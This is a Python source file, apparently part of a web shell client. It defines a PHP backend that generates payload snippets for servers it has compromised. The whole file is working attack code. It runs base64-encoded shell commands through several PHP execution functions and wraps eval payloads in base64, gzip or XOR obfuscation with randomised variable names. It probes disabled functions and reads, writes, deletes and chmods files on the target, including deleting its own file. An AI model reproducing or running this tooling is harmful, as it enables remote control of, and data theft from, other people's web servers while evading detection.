"""PHP backend — the PHP-specific code fragments, factored out of the executor."""

from __future__ import annotations

import base64

from ...encoders import EncodedPayload
from ...utils.strings import random_string
from .base import Backend, CommandBuilder

# Preference order: each maps a PHP function to a snippet that runs a
# base64-encoded command and echoes its combined stdout/stderr.
_EXEC_BUILDERS: dict[str, CommandBuilder] = {
    "system": lambda b64: f"system(base64_decode('{b64}'))",
    "passthru": lambda b64: f"passthru(base64_decode('{b64}'))",
    "shell_exec": lambda b64: f"echo shell_exec(base64_decode('{b64}'))",
    "exec": lambda b64: f"exec(base64_decode('{b64}'),$o);echo implode(chr(10),$o)",
    "popen": lambda b64: (
        f"$h=popen(base64_decode('{b64}'),'r');"
        "while(!feof($h)){echo fread($h,4096);}pclose($h)"
    ),
    "proc_open": lambda b64: (
        "$d=[1=>['pipe','w'],2=>['pipe','w']];"
        f"$p=proc_open(base64_decode('{b64}'),$d,$pp);"
        "echo stream_get_contents($pp[1]).stream_get_contents($pp[2]);"
        "proc_close($p)"
    ),
}


class PHPBackend(Backend):
    name = "php"
    capabilities = frozenset(
        {"command", "fs", "mysql", "pgsql", "portscan", "inject", "mount"}
    )
    supported_transforms = frozenset({"base64", "gzip", "xor"})

    def literal(self, value: str) -> str:
        return f"base64_decode('{base64.b64encode(value.encode()).decode()}')"

    def wrap_eval(self, payload: EncodedPayload) -> str:
        if payload.name == "base64":
            return f"eval(base64_decode('{payload.b64}'));"
        if payload.name == "gzip":
            return f"eval(gzinflate(base64_decode('{payload.b64}')));"
        if payload.name == "xor":
            key = payload.params["key"]
            var_d, var_k, var_o, var_i = (f"v{p}{random_string(4)}" for p in "dkoi")
            return (
                f"${var_d}=base64_decode('{payload.b64}');${var_k}='{key}';${var_o}='';"
                f"for(${var_i}=0;${var_i}<strlen(${var_d});${var_i}++)"
                f"{{${var_o}.=${var_d}[${var_i}]^${var_k}[${var_i}%strlen(${var_k})];}}"
                f"eval(${var_o});"
            )
        raise ValueError(f"PHP backend cannot decode transform {payload.name!r}")

    def sentinel(self, token: str, code: str) -> str:
        return f"echo '{token}';{code};echo '{token}';"

    def command_builders(self) -> dict[str, CommandBuilder]:
        return _EXEC_BUILDERS

    def disabled_functions_code(self) -> str | None:
        return "echo ini_get('disable_functions')"

    def webroot_code(self) -> str:
        return "echo $_SERVER['DOCUMENT_ROOT']"

    def version_code(self) -> str:
        return "echo phpversion()"

    # -- filesystem primitives -------------------------------------------------
    def read_text_code(self, path: str) -> str:
        return f"echo file_get_contents({self.literal(path)})"

    def read_b64_code(self, path: str) -> str:
        return f"echo base64_encode(file_get_contents({self.literal(path)}))"

    def read_range_code(self, path: str, offset: int, length: int) -> str:
        return (
            f"$f=fopen({self.literal(path)},'rb');fseek($f,{offset});"
            f"echo base64_encode(fread($f,{length}));fclose($f)"
        )

    def size_code(self, path: str) -> str:
        return f"echo filesize({self.literal(path)})"

    def md5_code(self, path: str) -> str:
        return f"echo md5(file_get_contents({self.literal(path)}))"

    def exists_code(self, path: str) -> str:
        return f"echo file_exists({self.literal(path)})?1:0"

    def is_dir_code(self, path: str) -> str:
        return f"echo is_dir({self.literal(path)})?1:0"

    def write_code(self, path: str, data_b64: str) -> str:
        return (
            f"echo file_put_contents({self.literal(path)},base64_decode('{data_b64}'))"
            "!==false?'OK':'FAIL'"
        )

    def delete_code(self, path: str | None) -> str:
        target = self.literal(path) if path else "__FILE__"
        return f"echo unlink({target})?'OK':'FAIL'"

    def list_dir_code(self, path: str) -> str:
        return (
            f"$d={self.literal(path)};"
            "foreach(scandir($d) as $n){if($n=='.'||$n=='..'){continue;}"
            "$p=$d.'/'.$n;$s=@stat($p);"
            "echo $n.chr(31).($s?$s[7]:0).chr(31).($s?sprintf('%o',$s[2]&0777):'0')"
            ".chr(31).($s?$s[9]:0).chr(31).(is_dir($p)?'d':'-').chr(30);}"
        )

    def move_code(self, src: str, dst: str) -> str:
        return f"echo rename({self.literal(src)},{self.literal(dst)})?'OK':'FAIL'"

    def copy_code(self, src: str, dst: str) -> str:
        return f"echo copy({self.literal(src)},{self.literal(dst)})?'OK':'FAIL'"

    def mkdir_code(self, path: str) -> str:
        return f"echo mkdir({self.literal(path)},0755,true)?'OK':'FAIL'"

    def chmod_code(self, path: str, mode: str) -> str:
        if not mode.isdigit():
            raise ValueError("mode must be octal digits, e.g. 755")
        return f"echo chmod({self.literal(path)},0{mode})?'OK':'FAIL'"
